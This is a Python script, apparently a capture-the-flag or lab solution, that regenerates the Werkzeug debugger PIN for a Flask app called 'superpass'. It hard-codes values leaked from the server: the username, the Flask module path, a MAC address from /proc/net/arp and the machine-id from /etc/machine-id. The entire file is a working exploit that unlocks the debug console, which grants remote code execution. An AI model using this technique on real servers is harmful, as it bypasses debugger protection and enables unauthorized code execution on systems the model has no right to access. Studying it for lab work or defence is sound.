#Made with <3 by BatBato
import hashlib
from itertools import chain
probably_public_bits = [
    'www-data',# username   /proc/self/environ
    'flask.app',# modname
    'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))  /app/app/superpass/app.py
    '/app/venv/lib/python3.10/site-packages/flask/app.py',#/app/app/superpass/app.py' # getattr(mod, '__file__', None),
]
#/app/venv/lib/python3.10/site-packages/flask/app.py

private_bits = [
    '345052392180',# str(uuid.getnode()),  /proc/net/arp => 00:50:56:b9:53:c1 => print(0x005056b953c1)
    'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
print(rv)
